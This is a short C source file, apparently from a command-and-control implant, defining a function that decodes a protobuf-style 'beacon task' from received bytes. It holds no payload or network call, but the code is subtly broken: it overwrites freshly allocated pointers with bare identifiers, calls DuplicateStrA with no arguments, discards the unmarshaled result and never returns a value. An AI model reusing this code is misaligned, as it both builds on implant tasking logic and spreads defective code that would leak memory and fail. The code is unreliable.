#include "pch.h"

PBEACON_TASK UnmarshalBeaconTask
(
	_In_ PBYTE pData,
	_In_ DWORD cbData
)
{
	LPVOID* pUnmarshaledResult = NULL;
	PPBElement RecvElement[3];
	DWORD i = 0;
	PBEACON_TASK pResult = NULL;

	for (i = 0; i < _countof(RecvElement); i++) {
		RecvElement[i] = ALLOC(sizeof(PPBElement));
		RecvElement[i]->dwFieldIdx = i + 1;
	}

	RecvElement[0] = Bytes;
	RecvElement[1] = StructType;
	RecvElement[2] = Varint;

	pUnmarshaledResult = UnmarshalStruct(RecvElement, _countof(RecvElement), pData, cbData, NULL);
	pResult = ALLOC(sizeof(BEACON_TASK));
	pResult->lpInstanceID = DuplicateStrA();
}